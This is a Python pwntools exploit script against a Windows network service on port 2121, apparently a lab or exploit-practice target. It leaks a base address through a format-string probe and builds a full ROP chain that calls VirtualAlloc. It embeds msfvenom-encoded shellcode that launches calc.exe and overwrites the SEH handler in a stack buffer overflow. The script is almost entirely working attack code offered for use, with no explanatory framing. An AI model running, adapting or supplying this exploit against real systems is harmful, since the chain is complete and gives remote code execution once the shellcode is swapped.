#!/usr/bin/python3
from pwn import remote, p32, pause

shell = remote("Windows", 2121)

shell.sendline(b"TEST %p.%p")
shell.recvuntil(b".")

binary_base = int(shell.recvline().strip(), 16) - 0x14120

rop  = b""
rop += p32(binary_base + 0x01010) * 30 # ret;
rop += p32(binary_base + 0x3711a) # pop eax; ret;
rop += p32(0x8314c2ab)            # offset + 0x40
rop += p32(binary_base + 0x32ce4) # sub eax, 0x8314c26b; ret;
rop += p32(binary_base + 0x01068) # pop esi; ret;
rop += p32(binary_base + 0x01068) # pop esi; ret;
rop += p32(binary_base + 0x48ca8) # xchg edi, eax; ret;
rop += p32(binary_base + 0x15638) # mov ecx, edi; call esi;
rop += p32(binary_base + 0x3711a) # pop eax; ret;
rop += p32(0x8314d26b)            # offset + 0x1000
rop += p32(binary_base + 0x32ce4) # sub eax, 0x8314c26b; ret;
rop += p32(binary_base + 0x3039f) # mov edx, eax; mov eax, esi; pop esi; ret;
rop += p32(0x41414141)            # padding for pop
rop += p32(binary_base + 0x0dc14) # pop ebx; ret;
rop += p32(0xffffffff)            # -1
rop += p32(binary_base + 0x301e9) # inc ebx; ret;
rop += p32(binary_base + 0x301e9) # inc ebx; ret;
rop += p32(binary_base + 0x0100f) # pop ebp; ret;
rop += p32(binary_base + 0x0100f) # pop ebp; ret;
rop += p32(binary_base + 0x01068) # pop esi; ret;
rop += p32(binary_base + 0x14af9) # jmp eax;
rop += p32(binary_base + 0x15354) # pop edi; ret;
rop += p32(0xffffcec0)            # VirtualAlloc() - TlsAlloc()
rop += p32(binary_base + 0x3711a) # pop eax; ret;
rop += p32(binary_base + 0x9013c) # TlsAlloc()
rop += p32(binary_base + 0x2bb8e) # mov eax, dword ptr [eax]; ret;
rop += p32(binary_base + 0x113a8) # add eax, edi; ret;
rop += p32(binary_base + 0x15354) # pop edi; ret;
rop += p32(binary_base + 0x01010) # ret;
rop += p32(binary_base + 0x113b1) # pushad; ret;
rop += p32(binary_base + 0x11394) # jmp esp;

# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x09\x0a\x0b\x0c\x0d\x20\x25' -f python -v shellcode -e x86/shikata_ga_nai -n 16
shellcode =  b""
shellcode += b"\x3f\x41\x4a\x27\x41\x40\xf8\xd6\x41\x9f\x9b"
shellcode += b"\x41\x90\x99\x98\x27\xd9\xf7\xd9\x74\x24\xf4"
shellcode += b"\xba\x68\x1d\xc1\x42\x5e\x33\xc9\xb1\x31\x83"
shellcode += b"\xee\xfc\x31\x56\x14\x03\x56\x7c\xff\x34\xbe"
shellcode += b"\x94\x7d\xb6\x3f\x64\xe2\x3e\xda\x55\x22\x24"
shellcode += b"\xae\xc5\x92\x2e\xe2\xe9\x59\x62\x17\x7a\x2f"
shellcode += b"\xab\x18\xcb\x9a\x8d\x17\xcc\xb7\xee\x36\x4e"
shellcode += b"\xca\x22\x99\x6f\x05\x37\xd8\xa8\x78\xba\x88"
shellcode += b"\x61\xf6\x69\x3d\x06\x42\xb2\xb6\x54\x42\xb2"
shellcode += b"\x2b\x2c\x65\x93\xfd\x27\x3c\x33\xff\xe4\x34"
shellcode += b"\x7a\xe7\xe9\x71\x34\x9c\xd9\x0e\xc7\x74\x10"
shellcode += b"\xee\x64\xb9\x9d\x1d\x74\xfd\x19\xfe\x03\xf7"
shellcode += b"\x5a\x83\x13\xcc\x21\x5f\x91\xd7\x81\x14\x01"
shellcode += b"\x3c\x30\xf8\xd4\xb7\x3e\xb5\x93\x90\x22\x48"
shellcode += b"\x77\xab\x5e\xc1\x76\x7c\xd7\x91\x5c\x58\xbc"
shellcode += b"\x42\xfc\xf9\x18\x24\x01\x19\xc3\x99\xa7\x51"
shellcode += b"\xe9\xce\xd5\x3b\x67\x10\x6b\x46\xc5\x12\x73"
shellcode += b"\x49\x79\x7b\x42\xc2\x16\xfc\x5b\x01\x53\xf2"
shellcode += b"\x11\x08\xf5\x9b\xff\xd8\x44\xc6\xff\x36\x8a"
shellcode += b"\xff\x83\xb2\x72\x04\x9b\xb6\x77\x40\x1b\x2a"
shellcode += b"\x05\xd9\xce\x4c\xba\xda\xda\x2e\x5d\x49\x86"
shellcode += b"\x9e\xf8\xe9\x2d\xdf"

offset = 1032
junk = b"A" * (offset - len(rop + shellcode))

nseh = b"B" * 4
seh = p32(binary_base + 0x11396) # add esp, 0xe10; ret;

payload  = b""
payload += rop
payload += shellcode
payload += junk
payload += nseh + seh
payload += b"D" * (4000 - len(payload))

shell.sendline(b"TEST " + payload)
shell.interactive()
